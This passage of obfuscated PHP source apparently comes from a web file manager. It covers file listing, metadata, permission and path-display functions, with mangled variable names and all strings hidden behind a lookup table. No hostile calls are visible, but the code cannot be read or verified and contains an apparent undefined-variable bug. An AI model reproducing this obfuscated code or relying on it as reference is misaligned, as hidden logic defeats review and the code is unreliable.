$‰ú÷¶¥; } unset($‰ú÷¶¥); } protected function _listMake(&$Á§¡¼Éí) { $çÆ¨û¼ =& $_SERVER[Ï×Œõ”û]; $Á§¡¼Éí[$çÆ¨û¼[85]] = array(); $Á§¡¼Éí[$çÆ¨û¼[86]] = array(); foreach ($Á§¡¼Éí[$çÆ¨û¼[447]] as $ßŸÛ€·û) { $õÁñœÈ´ = $ßŸÛ€·û[$çÆ¨û¼[505]] == 1 ? $çÆ¨û¼[85] : $çÆ¨û¼[86]; $Á§¡¼Éí[$õÁñœÈ´][] = $ßŸÛ€·û; } unset($Á§¡¼Éí[$çÆ¨û¼[447]]); } protected function _listAppendMeta(&$ÄëŠÆ¶¿, $°«æ×Û») { $ƒ¤óÀúù =& $_SERVER[Ï×Œõ”û]; $ÀÄœÅ¥¤ = array($ƒ¤óÀúù[511] => array($ƒ¤óÀúù[512], $°«æ×Û»)); $ô­¯„Œ = Model($ƒ¤óÀúù[554])->field($ƒ¤óÀúù[555])->where($ÀÄœÅ¥¤)->select(); if (!$ô­¯„Œ) { return; } $í³ƒàş = array($ƒ¤óÀúù[556], $ƒ¤óÀúù[557], $ƒ¤óÀúù[536]); $œãˆ³“î = array(); foreach ($ô­¯„Œ as $ó™¼áÑ) { if (!isset($œãˆ³“î[$ó™¼áÑ[$ƒ¤óÀúù[193]]])) { $œãˆ³“î[$ó™¼áÑ[$ƒ¤óÀúù[193]]] = array(); } if (in_array($ó™¼áÑ[$ƒ¤óÀúù[95]], $í³ƒàş)) { continue; } if ($ó™¼áÑ[$ƒ¤óÀúù[95]] == $ƒ¤óÀúù[558]) { $ó™¼áÑ[$ƒ¤óÀúù[452]] = $ƒ¤óÀúù[559]; } $œãˆ³“î[$ó™¼áÑ[$ƒ¤óÀúù[193]]][$ó™¼áÑ[$ƒ¤óÀúù[95]]] = $ó™¼áÑ[$ƒ¤óÀúù[452]]; } foreach ($ÄëŠÆ¶¿ as &$éç…µ¡) { $éç…µ¡[$ƒ¤óÀúù[560]] = !1; if (isset($œãˆ³“î[$éç…µ¡[$ƒ¤óÀúù[193]]])) { $éç…µ¡[$ƒ¤óÀúù[560]] = $œãˆ³“î[$éç…µ¡[$ƒ¤óÀúù[193]]]; } if ($this->fileIsLock($éç…µ¡) && $éç…µ¡[$ƒ¤óÀúù[507]]) { $©ºŸ¶™¹ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $éç…µ¡[$ƒ¤óÀúù[507]][$ƒ¤óÀúù[508]] = AuthModel::authDisable($éç…µ¡[$ƒ¤óÀúù[507]][$ƒ¤óÀúù[508]], $©ºŸ¶™¹); $éç…µ¡[$ƒ¤óÀúù[507]][$ƒ¤óÀúù[561]][$ƒ¤óÀúù[507]] = $éç…µ¡[$ƒ¤óÀúù[507]][$ƒ¤óÀúù[508]]; } } unset($éç…µ¡); } protected function _listAppendFileMeta(&$ ™ƒéáÄ, $ôÚùĞ) { $˜£„ËÙğ =& $_SERVER[Ï×Œõ”û]; $ÈÁÄ§„÷ = array_to_keyvalue($ ™ƒéáÄ, $˜£„ËÙğ[12], $˜£„ËÙğ[562]); $ÈÁÄ§„÷ = array_filter(array_unique($ÈÁÄ§„÷)); $ÈÁÄ§„÷ = array_to_int($ÈÁÄ§„÷); if (!$ÈÁÄ§„÷) { return; } $¤Õ÷“Ÿı = array($˜£„ËÙğ[563] => array($˜£„ËÙğ[512], $ÈÁÄ§„÷)); $ÊÖÇâ­µ = $˜£„ËÙğ[564]; $†Ù”ò³Æ = Model($˜£„ËÙğ[565])->field($ÊÖÇâ­µ)->where($¤Õ÷“Ÿı)->select(); $†Ù”ò³Æ = array_to_keyvalue($†Ù”ò³Æ, $˜£„ËÙğ[562]); $ÛßäêìÄ = Model($˜£„ËÙğ[566])->field($˜£„ËÙğ[567])->where($¤Õ÷“Ÿı)->select(); $ÛßäêìÄ = $ÛßäêìÄ ? $ÛßäêìÄ : array(); $ˆñ²Ãê’ = array(); foreach ($ÛßäêìÄ as $õÙÊüíÎ) { if (!isset($ˆñ²Ãê’[$õÙÊüíÎ[$˜£„ËÙğ[562]]])) { $ˆñ²Ãê’[$õÙÊüíÎ[$˜£„ËÙğ[562]]] = array(); } $ˆñ²Ãê’[$õÙÊüíÎ[$˜£„ËÙğ[562]]][$õÙÊüíÎ[$˜£„ËÙğ[95]]] = $õÙÊüíÎ[$˜£„ËÙğ[452]]; } foreach ($ ™ƒéáÄ as &$¬ˆëªå“) { $ùÑş = $¬ˆëªå“[$˜£„ËÙğ[562]]; if (!$ùÑş || !is_array($†Ù”ò³Æ[$ùÑş])) { continue; } $³ä¸ÀÏ = $†Ù”ò³Æ[$ùÑş]; $³ä¸ÀÏ[$˜£„ËÙğ[79]] = $¬ˆëªå“[$˜£„ËÙğ[79]]; $³ä¸ÀÏ[$˜£„ËÙğ[32]] = $¬ˆëªå“[$˜£„ËÙğ[32]]; if (!$³ä¸ÀÏ[$˜£„ËÙğ[568]]) { Model($˜£„ËÙğ[565])->fileMd5Check($³ä¸ÀÏ); } if (!isset(self::$cacheFileInfo[$˜£„ËÙğ[569] . $ùÑş])) { self::$cacheFileInfo[$˜£„ËÙğ[569] . $ùÑş] = array_merge(array(), $³ä¸ÀÏ); } unset($†Ù”ò³Æ[$ùÑş][$˜£„ËÙğ[87]]); $·ÁğÛñ• = isset($ˆñ²Ãê’[$ùÑş]) && is_array($ˆñ²Ãê’[$ùÑş]) ? $ˆñ²Ãê’[$ùÑş] : array(); $¬ˆëªå“[$˜£„ËÙğ[169]] = array_merge($·ÁğÛñ•, $†Ù”ò³Æ[$ùÑş]); if (isset($¬ˆëªå“[$˜£„ËÙğ[169]][$˜£„ËÙğ[184]])) { $¬ˆëªå“[$˜£„ËÙğ[184]] = json_decode($¬ˆëªå“[$˜£„ËÙğ[169]][$˜£„ËÙğ[184]], !0); unset($¬ˆëªå“[$˜£„ËÙğ[169]][$˜£„ËÙğ[184]]); } } unset($¬ˆëªå“); } protected function _listAppendSourceInfo(&$Ÿ‰ù¯Œ, $•ñ¹¸Ú„) { $–¿í™ì‘ =& $_SERVER[Ï×Œõ”û]; $ğßÒ¹¯ = Model($–¿í™ì‘[570])->listData(); $›¾´ÆÇç = Model($–¿í™ì‘[519])->listData(); $“×²Œ¬» = Model($–¿í™ì‘[509])->listData(); $˜‡İèÉÕ = Model($–¿í™ì‘[571])->listSimple(); $Ìé±ˆş» = array_to_keyvalue($ğßÒ¹¯, $–¿í™ì‘[484]); $ªÙœÃÜ‡ = array_to_keyvalue_group($›¾´ÆÇç, $–¿í™ì‘[87], $–¿í™ì‘[520]); $º áÄ¤å = array_to_keyvalue($“×²Œ¬», $–¿í™ì‘[87]); $©µ§½Î = array_to_keyvalue_group($˜‡İèÉÕ, $–¿í™ì‘[193]); foreach ($Ÿ‰ù¯Œ as &$®ÁÈ¤¹”) { $®ÁÈ¤¹”[$–¿í™ì‘[90]] = array($–¿í™ì‘[572] => 0, $–¿í™ì‘[573] => 0, $–¿í™ì‘[574] => 0); if (isset($º áÄ¤å[$®ÁÈ¤¹”[$–¿í™ì‘[193]]])) { $®ÁÈ¤¹”[$–¿í™ì‘[90]][$–¿í™ì‘[575]] = 1; $®ÁÈ¤¹”[$–¿í™ì‘[90]][$–¿í™ì‘[576]] = $º áÄ¤å[$®ÁÈ¤¹”[$–¿í™ì‘[193]]][$–¿í™ì‘[32]]; } if ($ªÙœÃÜ‡ && $Ìé±ˆş» && isset($ªÙœÃÜ‡[$®ÁÈ¤¹”[$–¿í™ì‘[193]]])) { $®ÁÈ¤¹”[$–¿í™ì‘[90]][$–¿í™ì‘[577]] = array(); foreach ($ªÙœÃÜ‡[$®ÁÈ¤¹”[$–¿í™ì‘[193]]] as $ä¤øë®) { $İãİ»… = $Ìé±ˆş»[$ä¤øë®]; $®ÁÈ¤¹”[$–¿í™ì‘[90]][$–¿í™ì‘[577]][] = array($–¿í™ì‘[578] => $İãİ»…[$–¿í™ì‘[484]], $–¿í™ì‘[514] => $İãİ»…[$–¿í™ì‘[32]], $–¿í™ì‘[579] => $İãİ»…[$–¿í™ì‘[580]]); } } if ($©µ§½Î && isset($©µ§½Î[$®ÁÈ¤¹”[$–¿í™ì‘[193]]])) { $®ÁÈ¤¹”[$–¿í™ì‘[90]][$–¿í™ì‘[581]] = array(); foreach ($©µ§½Î[$®ÁÈ¤¹”[$–¿í™ì‘[193]]] as $Çüòì¹•) { $®ÁÈ¤¹”[$–¿í™ì‘[90]][$–¿í™ì‘[581]] = $this->shareFilterShow($Çüòì¹•); } } } unset($®ÁÈ¤¹”); return $Ÿ‰ù¯Œ; } protected function shareFilterShow($Äï…ùŞ›) { $‚– ¼ı‰ =& $_SERVER[Ï×Œõ”û]; if (!$Äï…ùŞ›) { return $Äï…ùŞ›; } $®ê™µ¢ = $‚– ¼ı‰[582]; if ($Äï…ùŞ›[$‚– ¼ı‰[583]] == $‚– ¼ı‰[91]) { $®ê™µ¢ .= $‚– ¼ı‰[584]; } if (is_array($Äï…ùŞ›[$‚– ¼ı‰[585]]) && is_array($Äï…ùŞ›[$‚– ¼ı‰[585]][$‚– ¼ı‰[586]])) { $Äï…ùŞ›[$‚– ¼ı‰[585]][$‚– ¼ı‰[586]] = $‚– ¼ı‰[587]; } if (!$ò¸µÅ«[$‚– ¼ı‰[588]] && $ò¸µÅ«[$‚– ¼ı‰[193]] != $‚– ¼ı‰[230]) { $ò¸µÅ«[$‚– ¼ı‰[588]] = KodIO::make($ò¸µÅ«[$‚– ¼ı‰[193]]); } $Äï…ùŞ› = array_field_key($Äï…ùŞ›, explode($‚– ¼ı‰[50], $®ê™µ¢)); return $Äï…ùŞ›; } protected function _listAppendChildren(&$–’ÅÌÎ½, $Û•’­û) { $¥Äñ› =& $_SERVER[Ï×Œõ”û]; $ûğÇØ¬ = array(); $«²‰¢Ñ = array($¥Äñ›[241] => 0, $¥Äñ›[242] => 0); foreach ($–’ÅÌÎ½ as &$’Ì¦‹Ø¾) { if (!$’Ì¦‹Ø¾[$¥Äñ›[505]]) { continue; } $ûğÇØ¬[] = intval($’Ì¦‹Ø¾[$¥Äñ›[193]]); } unset($’Ì¦‹Ø¾); if (!$ûğÇØ¬) { return; } $®ø·Ğáì = array($¥Äñ›[192] => array($¥Äñ›[7], $ûğÇØ¬), $¥Äñ›[525] => 0); $şùıëšÃ = array($¥Äñ›[192], $¥Äñ›[505], $¥Äñ›[589] => $¥Äñ›[590]); $­ñÖÊ† = $this->field($şùıëšÃ)->where($®ø·Ğáì)->group($¥Äñ›[591])->select(); $ƒğâü•¯ = array(); foreach ($­ñÖÊ† as $¸úÛ€çà) { $ê«êÄÔª = $¸úÛ€çà[$¥Äñ›[192]]; $Éö†±Ÿ = $¸úÛ€çà[$¥Äñ›[505]] == $¥Äñ›[91] ? $¥Äñ›[242] : $¥Äñ›[241]; if (!isset($ƒğâü•¯[$ê«êÄÔª])) { $ƒğâü•¯[$ê«êÄÔª] = array($¥Äñ›[241] => 0, $¥Äñ›[242] => 0); } $ƒğâü•¯[$ê«êÄÔª][$Éö†±Ÿ] += $¸úÛ€çà[$¥Äñ›[590]]; } foreach ($–’ÅÌÎ½ as &$’Ì¦‹Ø¾) { if (!$’Ì¦‹Ø¾[$¥Äñ›[505]]) { continue; } $ïÂËêÖ‰ = is_array($ƒğâü•¯[$’Ì¦‹Ø¾[$¥Äñ›[193]]]) ? $ƒğâü•¯[$’Ì¦‹Ø¾[$¥Äñ›[193]]] : $«²‰¢Ñ; $’Ì¦‹Ø¾[$¥Äñ›[242]] = $ïÂËêÖ‰[$¥Äñ›[242]]; $’Ì¦‹Ø¾[$¥Äñ›[241]] = $ïÂËêÖ‰[$¥Äñ›[241]]; unset($’Ì¦‹Ø¾[$¥Äñ›[506]]); } unset($’Ì¦‹Ø¾); } protected function _listAppendAuth(&$èé“é¹) { $…ì´Îá =& $_SERVER[Ï×Œõ”û]; $æö»åé = array(); foreach ($èé“é¹ as $Ÿ°½Ü‘) { if ($Ÿ°½Ü‘[$…ì´Îá[190]] == self::TYPE_GROUP) { $æö»åé[] = intval($Ÿ°½Ü‘[$…ì´Îá[193]]); } } if (!$æö»åé) { return; } $úŒ¥ì…¸ = array_to_keyvalue($èé“é¹, $…ì´Îá[193]); $îßÁÃ„ç = Model($…ì´Îá[592])->getSourceList($æö»åé, $úŒ¥ì…¸); $Õßú¬äì = KodUser::isRoot(); foreach ($èé“é¹ as $®‹Éú„Ç => &$Ÿ°½Ü‘) { $Ÿ°½Ü‘[$…ì´Îá[507]] = $îßÁÃ„ç[$Ÿ°½Ü‘[$…ì´Îá[193]]]; if (!$Ÿ°½Ü‘[$…ì´Îá[507]] && $Ÿ°½Ü‘[$…ì´Îá[190]] == self::TYPE_GROUP) { $Ÿ°½Ü‘[$…ì´Îá[507]] = Action($…ì´Îá[593])->pathGroupAuthMake($Ÿ°½Ü‘[$…ì´Îá[594]]); if (!$Ÿ°½Ü‘[$…ì´Îá[507]] && !$Õßú¬äì) { $Ÿ°½Ü‘[$…ì´Îá[235]] = !1; $Ÿ°½Ü‘[$…ì´Îá[234]] = !1; } } if ($Ÿ°½Ü‘[$…ì´Îá[507]]) { $Ÿ°½Ü‘[$…ì´Îá[235]] = AuthModel::authCheckEdit($Ÿ°½Ü‘[$…ì´Îá[507]][$…ì´Îá[508]]); $Ÿ°½Ü‘[$…ì´Îá[234]] = AuthModel::authCheckView($Ÿ°½Ü‘[$…ì´Îá[507]][$…ì´Îá[508]]); } $this->groupPathDisplay($Ÿ°½Ü‘); } unset($Ÿ°½Ü‘); } public function _listAppendAuthSecret(&$åº›‡ß¨) { $¥³ÑõÈ© =& $_SERVER[Ï×Œõ”û]; if (Model($¥³ÑõÈ©[527])->get($¥³ÑõÈ©[595]) != $¥³ÑõÈ©[91]) { return; } static $ÙÀ”í°ê = false; if (!$ÙÀ”í°ê) { $â¾…¢½ = Model($¥³ÑõÈ©[596]); $Ã«ô’Îû = Model($¥³ÑõÈ©[597]); $ÙÀ”í°ê = $Ã«ô’Îû->listData(); $ÙÀ”í°ê = array_to_keyvalue($ÙÀ”í°ê, $¥³ÑõÈ©[193]); $›Ÿä© = json_decode(Model($¥³ÑõÈ©[527])->get($¥³ÑõÈ©[598]), !0); $›Ÿä© = array_to_keyvalue($›Ÿä©, $¥³ÑõÈ©[484]); foreach ($ÙÀ”í°ê as $¤®éüœ‰ => $Š­¯µœ…) { $»³Ç«Ä = $›Ÿä©[$Š­¯µœ…[$¥³ÑõÈ©[599]]]; if (!$»³Ç«Ä) { $Ã«ô’Îû->remove($Š­¯µœ…[$¥³ÑõÈ©[484]]); unset($ÙÀ”í°ê[$¤®éüœ‰]); continue; } $÷½İ·š¸ = $â¾…¢½->listData($»³Ç«Ä[$¥³ÑõÈ©[507]]); if (!$÷½İ·š¸) { $Ã«ô’Îû->remove($Š­¯µœ…[$¥³ÑõÈ©[484]]); unset($ÙÀ”í°ê[$¤®éüœ‰]); continue; } $Š­¯µœ…[$¥³ÑõÈ©[507]] = $÷½İ·š¸; $Š­¯µœ…[$¥³ÑõÈ©[600]] = $»³Ç«Ä; $Š­¯µœ…[$¥³ÑõÈ©[601]] = Model($¥³ÑõÈ©[602])->getInfoSimpleOuter($Š­¯µœ…[$¥³ÑõÈ©[546]]); $ÙÀ”í°ê[$¤®éüœ‰] = $Š­¯µœ…; } } $ÏÅ®¦†û = USER_ID; $ß¯¥­›¹ = array(); $‘í–¬ì = $this->_listAppendPath($ß¯¥­›¹, !0); foreach ($åº›‡ß¨ as $¤®éüœ‰ => &$Š­¯µœ…) { if (!is_array($Š­¯µœ…[$¥³ÑõÈ©[507]])) { continue; } if ($Š­¯µœ…[$¥³ÑõÈ©[190]] != $¥³ÑõÈ©[603]) { continue; } if (isset($ÙÀ”í°ê[$Š­¯µœ…[$¥³ÑõÈ©[193]]])) { $—îš¯ó = $ÙÀ”í°ê[$Š­¯µœ…[$¥³ÑõÈ©[193]]]; if (!is_array($Š­¯µœ…[$¥³ÑõÈ©[560]])) { $Š­¯µœ…[$¥³ÑõÈ©[560]] = array(); } $Š­¯µœ…[$¥³ÑõÈ©[560]][$¥³ÑõÈ©[604]] = $—îš¯ó[$¥³ÑõÈ©[599]]; $Š­¯µœ…[$¥³ÑõÈ©[507]][$¥³ÑõÈ©[605]] = $—îš¯ó; $Š­¯µœ…[$¥³ÑõÈ©[507]][$¥³ÑõÈ©[606]] = $Š­¯µœ…[$¥³ÑõÈ©[607]]; $Š­¯µœ…[$¥³ÑõÈ©[507]][$¥³ÑõÈ©[608]] = $¥³ÑõÈ©[91]; if ($—îš¯ó[$¥³ÑõÈ©[546]] != $ÏÅ®¦†û) { $Š­¯µœ…[$¥³ÑõÈ©[507]][$¥³ÑõÈ©[508]] = $Š­¯µœ…[$¥³ÑõÈ©[507]][$¥³ÑõÈ©[508]] & $—îš¯ó[$¥³ÑõÈ©[507]][$¥³ÑõÈ©[507]]; } continue; } $½ƒ¬¦²Í = $this->parentLevelArray($Š­¯µœ…[$¥³ÑõÈ©[609]]); $šòÌÆ¦Ê = array_reverse($½ƒ¬¦²Í); foreach ($šòÌÆ¦Ê as $µ–„³ñÊ => $‚ôêÌÇ) { if (!isset($ÙÀ”í°ê[$‚ôêÌÇ])) { continue; } $—îš¯ó = $ÙÀ”í°ê[$‚ôêÌÇ]; $Š­¯µœ…[$¥³ÑõÈ©[507]][$¥³ÑõÈ©[605]] = $—îš¯ó; if ($—îš¯ó[$¥³ÑõÈ©[546]] != $ÏÅ®¦†û) { $Š­¯µœ…[$¥³ÑõÈ©[507]][$¥³ÑõÈ©[508]] = $Š­¯µœ…[$¥³ÑõÈ©[507]][$¥³ÑõÈ©[508]] & $—îš¯ó[$¥³ÑõÈ©[507]][$¥³ÑõÈ©[507]]; } $Œù‚â–§ = $¥³ÑõÈ©[12]; $·Í™×ï³ = count($½ƒ¬¦²Í) - $µ–„³ñÊ; for ($ÆıİŸ­  = 0; $ÆıİŸ­  < $·Í™×ï³; $ÆıİŸ­ ++) { if (!isset($‘í–¬ì[$½ƒ¬¦²Í[$ÆıİŸ­ ]])) { $Œù‚â–§ = $¥³ÑõÈ©[12]; break; } $Œù‚â–§ = $Œù‚â–§ . rtrim($‘í–¬ì[$½ƒ¬¦²Í[$ÆıİŸ­ ]], $¥³ÑõÈ©[8]) . $¥³ÑõÈ©[8]; } $Š­¯µœ…[$¥³ÑõÈ©[507]][$¥³ÑõÈ©[606]] = rtrim($Œù‚â–§, $¥³ÑõÈ©[8]) . $¥³ÑõÈ©[8]; break; } } unset($Š­¯µœ…); } public function groupPathDisplay(&$ß¢É£“Å) { $”²‡¸ğ =& $_SERVER[Ï×Œõ”û]; if ($ß¢É£“Å[$”²‡¸ğ[190]] != self::TYPE_GROUP) { return; } $ò€õ‰¨Ê = Model($”²‡¸ğ[610])->getInfo($ß¢É£“Å[$”²‡¸ğ[594]]); $ä‹°ÒÔ‹ = $this->parentLevelArray($ò€õ‰¨Ê[$”²‡¸ğ[609]]); $ù¦óïÜÓ = $”²‡¸ğ[12]; foreach ($ä‹°ÒÔ‹ as $¦Ïş¥ø) { $ù³§²±Ã = Model($”²‡¸ğ[610])->getInfo($¦Ïş¥ø); $ù¦óïÜÓ .= $ù³§²±Ã[$”²‡¸ğ[90]][$”²‡¸ğ[193]] . $”²‡¸ğ[50]; } $ß¢É£“Å[$”²‡¸ğ[611]] = $ò€õ‰¨Ê[$”²‡¸ğ[192]]; $ß¢É£“Å[$”²‡¸ğ[612]] = $ò€õ‰¨Ê[$”²‡¸ğ[609]]; $ß¢É£“Å[$”²‡¸ğ[613]] = $ò€õ‰¨Ê[$”²‡¸ğ[614]]; $ß¢É£“Å[$”²‡¸ğ[615]] = $ù¦óïÜÓ . $ò€õ‰¨Ê[$”²‡¸ğ[90]][$”²‡¸ğ[193]]; } protected function _listAppendPath(&$»Ä¨´ÕØ, $‰ôıéµÑ = false) { $…º®¬’÷ =& $_SERVER[Ï×Œõ”û]; static $´¼ÆÃÖç = array(); $‘Ê¶ä–ñ = array(); $æë÷Ïü¨ = array(); if ($‰ôıéµÑ) { return $´¼ÆÃÖç; } foreach ($»Ä¨´ÕØ as &$œöı›„•) { $ €­Í„ = $œöı›„•[$…º®¬’÷[193]]; if ($œöı›„•[$…º®¬’÷[505]] == $…º®¬’÷[91] && $œöı›„•[$…º®¬’÷[192]] != 0) { $´¼ÆÃÖç[$ €­Í„] = $œöı›„•[$…º®¬’÷[32]]; } if ($œöı›„•[$…º®¬’÷[505]] == $…º®¬’÷[91] && $œöı›„•[$…º®¬’÷[192]] == 0) { $´¼ÆÃÖç[$ €­Í„] = $this->_listAppendPathRoot($œöı›„•, array()); } if (isset($æë÷Ïü¨[$œöı›„•[$…º®¬’÷[609]]])) { continue; } $æë÷Ïü¨[$œöı›„•[$…º®¬’÷[609]]] = !0; $Íúß”ø = $this->parentLevelArray($œöı›„•[$…º®¬’÷[609]]); foreach ($Íúß”ø as $ğğîçˆ± => $ŞìÉ¼Ì¨) { if (isset($´¼ÆÃÖç[$ŞìÉ¼Ì¨])) { continue; } if ($ğğîçˆ± == 0) { $´¼ÆÃÖç[$ŞìÉ¼Ì¨] = $this->_listAppendPathRoot($œöı›„•, $Íúß”ø); } if ($ğğîçˆ± != 0) { $‘Ê¶ä–ñ[] = $ŞìÉ¼Ì¨; } } } unset($œöı›„•); $‘Ê¶ä–ñ = array_unique($‘Ê¶ä–ñ); if (count($‘Ê¶ä–ñ) > 0) { $ÓÉ·à¼‹ = array($…º®¬’÷[511] => array($…º®¬’÷[512], $‘Ê¶ä–ñ)); if (count($‘Ê¶ä–ñ) == 1) { $¥±Åù¢ = $this->sourceInfo($‘Ê¶ä–ñ[0]); $³ÒÛ˜Å = is_array($¥±Åù¢) ? array($¥±Åù¢) : !1; } else { $³ÒÛ˜Å = $this->field($…º®¬’÷[616])->where($ÓÉ·à¼‹)->select(); } if (!$³ÒÛ˜Å) { $³ÒÛ˜Å = array(); } foreach ($³ÒÛ˜Å as $Š‰—™¸º) { $´¼ÆÃÖç[$Š‰—™¸º[$…º®¬’÷[193]]] = $Š‰—™¸º[$…º®¬’÷[32]]; } } $³è±ÈÒÌ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ŞèîØú– = array(); foreach ($»Ä¨´ÕØ as &$œöı›„•) { $Ğ¶¾ö ş = $œöı›„•[$…º®¬’÷[609]]; $™üŒ°Ç” = $…º®¬’÷[12]; if (isset($ŞèîØú–[$Ğ¶¾ö ş])) { $™üŒ°Ç” = $ŞèîØú–[$Ğ¶¾ö ş]; } else { $Íúß”ø = $this->parentLevelArray($œöı›„•[$…º®¬’÷[609]]); foreach ($Íúß”ø as $ğğîçˆ± => $ŞìÉ¼Ì¨) { if (isset($´¼ÆÃÖç[$ŞìÉ¼Ì¨])) { $™üŒ°Ç” .= $´¼ÆÃÖç[$ŞìÉ¼Ì¨] . $…º®¬’÷[8]; } } $ŞèîØú–[$Ğ¶¾ö ş] = $™üŒ°Ç”; } $™üŒ°Ç” .= $œöı›„•[$…º®¬’÷[32]]; if ($œöı›„•[$…º®¬’÷[505]] == $…º®¬’÷[91]) { $™üŒ°Ç” .= $…º®¬’÷[8]; } $œöı›„•[$…º®¬’÷[607]] = str_replace($…º®¬’÷[256], $…º®¬’÷[8], $™üŒ°Ç”); if ($œöı›„•[$…º®¬’÷[192]] == $…º®¬’÷[230]) { $œöı›„•[$…º®¬’÷[32]] = trim($´¼ÆÃÖç[$œöı›„•[$…º®¬’÷[193]]], $…º®¬’÷[8]); $œöı›„•[$…º®¬’÷[607]] = $œöı›„•[$…º®¬’÷[32]] . $…º®¬’÷[8]; } if (intval($œöı›„•[$…º®¬’÷[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($œöı›„•, $Íúß”ø, $³è±ÈÒÌ); } } unset($œöı›„•); return $»Ä¨´ÕØ; } private function _listAppendPathRecycle(&$¯ÇûÎ§¼, $óßÎ³µª, $ÅÖÌ‰‡) { $ï—¢şş =& $_SERVER[Ï×Œõ”û]; if (!in_array($ÅÖÌ‰‡, $óßÎ³µª) && $¯ÇûÎ§¼[$ï—¢şş[193]] != $ÅÖÌ‰‡) { return; } $°ıïäÊÀ = explode($ï—¢şş[8], trim($¯ÇûÎ§¼[$ï—¢şş[607]], $ï—¢şş[8])); $ŠÙ˜…Éà = implode($ï—¢şş[8], array_slice($°ıïäÊÀ, 2)); $¯ÇûÎ§¼[$ï—¢şş[607]] = $ï—¢şş[8] . LNG($ï—¢şş[617]) . $ï—¢şş[8] . ltrim($ŠÙ˜…Éà, $ï—¢şş[8]); $¯ÇûÎ§¼[$ï—¢şş[609]] = $ï—¢şş[618] . implode($ï—¢şş[50], array_slice($óßÎ³µª, 1)) . $ï—¢şş[50]; if ($¯ÇûÎ§¼[$ï—¢şş[193]] == $ÅÖÌ‰‡) { $¯ÇûÎ§¼[$ï—¢şş[609]] = $ï—¢şş[618]; $¯ÇûÎ§¼[$ï—¢şş[192]] = $ï—¢şş[230]; $¯ÇûÎ§¼[$ï—¢şş[32]] = LNG($ï—¢şş[617]); } $¯ÇûÎ§¼[$ï—¢şş[619]] = $ï—¢şş[620]; } protected function _listAppendPathRoot(&$‡É¬›, $©ìîü“‘) { $×İ¾æà’ =& $_SERVER[Ï×Œõ”û]; static $ó¾µş³ = false; static $äî¤÷âÃ = false; $Ô‚Šá = $×İ¾æà’[12]; if ($‡É¬›[$×İ¾æà’[190]] == self::TYPE_USER) { if ($‡É¬›[$×İ¾æà’[594]] == USER_ID) { $Ô‚Šá = LNG($×İ¾æà’[621]); if ($ó¾µş³ === !1) { $Óƒóêü = Model($×İ¾æà’[622])->getInfoFull(USER_ID); $ó¾µş³ = _get($Óƒóêü, $×İ¾æà’[623], $×İ¾æà’[12]); } if ($äî¤÷âÃ === !1) { $Óƒóêü = Model($×İ¾æà’[622])->getInfoFull(USER_ID); $äî¤÷âÃ = _get($Óƒóêü, $×İ¾æà’[624], $×İ¾æà’[12]); } if ($©ìîü“‘ && $©ìîü“‘[0] == $ó¾µş³ || !$©ìîü“‘ && $‡É¬›[$×İ¾æà’[193]] == $ó¾µş³) { $Ô‚Šá = LNG($×İ¾æà’[625]); $‡É¬›[$×İ¾æà’[626]] = $×İ¾æà’[627]; } if ($©ìîü“‘ && $©ìîü“‘[0] == $äî¤÷âÃ || !$©ìîü“‘ && $‡É¬›[$×İ¾æà’[193]] == $äî¤÷âÃ) { $Ô‚Šá = $Ô‚Šá . $×İ¾æà’[628] . LNG($×İ¾æà’[629]); } if (!$©ìîü“‘) { $‡É¬›[$×İ¾æà’[32]] = $Ô‚Šá; } } else { $Óƒóêü = Model($×İ¾æà’[622])->getInfoFull($‡É¬›[$×İ¾æà’[594]]); $¾Îßº’ø = _get($Óƒóêü, $×İ¾æà’[624], $×İ¾æà’[12]); $‡É¬›[$×İ¾æà’[630]] = Model($×İ¾æà’[602])->getInfoSimpleOuter($‡É¬›[$×İ¾æà’[594]]); $Ô‚Šá = LNG($×İ¾æà’[631]) . $×İ¾æà’[175] . $‡É¬›[$×İ¾æà’[630]][$×İ¾æà’[32]] . $×İ¾æà’[177]; if ($©ìîü“‘ && $©ìîü“‘[0] == $¾Îßº’ø || !$©ìîü“‘ && $‡É¬›[$×İ¾æà’[193]] == $¾Îßº’ø) { $Ô‚Šá = LNG($×İ¾æà’[631]) . $×İ¾æà’[632] . $‡É¬›[$×İ¾æà’[630]][$×İ¾æà’[32]] . $×İ¾æà’[628] . LNG($×İ¾æà’[629]) . $×İ¾æà’[177]; } } } else { if ($‡É¬›[$×İ¾æà’[190]] == self::TYPE_GROUP) { $î“¯ïñ« = Model($×İ¾æà’[610])->getInfoSimple($‡É¬›[$×İ¾æà’[594]]); $Ô‚Šá = $î“¯ïñ«[$×İ¾æà’[32]]; } else { if ($‡É¬›[$×İ¾æà’[190]] == self::TYPE_SYSTEM) { $Ô‚Šá = $×İ¾æà’[633]; } } } $Ô‚Šá = $Ô‚Šá ? $×İ¾æà’[8] . $Ô‚Šá . $×İ¾æà’[8] : $×İ¾æà’[8]; return $Ô‚Šá; } protected function _listAppendUser(&$í»“«µõ) { $ĞÙ…„È” =& $_SERVER[Ï×Œõ”û]; $²íêãöİ = array_to_keyvalue($í»“«µõ, $ĞÙ…„È”[12], $ĞÙ…„È”[546]); $Û’£ÙÔ• = array_to_keyvalue($í»“«µõ, $ĞÙ…„È”[12], $ĞÙ…„È”[548]); $î¦²‚äâ = array_merge($²íêãöİ, $Û’£ÙÔ•); $ÖĞÒŠ²Ø = Model($ĞÙ…„È”[622])->userListInfo($î¦²‚äâ); foreach ($í»“«µõ as &$˜¦»Î¸ç) { $„Şß¸Ôœ = $˜¦»Î¸ç[$ĞÙ…„È”[546]]; $˜¦»Î¸ç[$ĞÙ…„È”[546]] = $ÖĞÒŠ²Ø[$„Şß¸Ôœ] ? $ÖĞÒŠ²Ø[$„Şß¸Ôœ] : !1; $„Şß¸Ôœ = $˜¦»Î¸ç[$ĞÙ…„È”[548]]; $˜¦»Î¸ç[$ĞÙ…„È”[548]] = $ÖĞÒŠ²Ø[$„Şß¸Ôœ] ? $ÖĞÒŠ²Ø[$„Şß¸Ôœ] : !1; if (_get($˜¦»Î¸ç, $ĞÙ…„È”[634], 0)) { $È°û…À¾ = $GLOBALS[$ĞÙ…„È”[6]][$ĞÙ…„È”[92]][$ĞÙ…„È”[635]]; if ($˜¦»Î¸ç[$ĞÙ…„È”[560]][$ĞÙ…„È”[636]] <= time() - $È°û…À¾) { $this->metaSet($˜¦»Î¸ç[$ĞÙ…„È”[193]], $ĞÙ…„È”[637], null); $this->metaSet($˜¦»Î¸ç[$ĞÙ…„È”[193]], 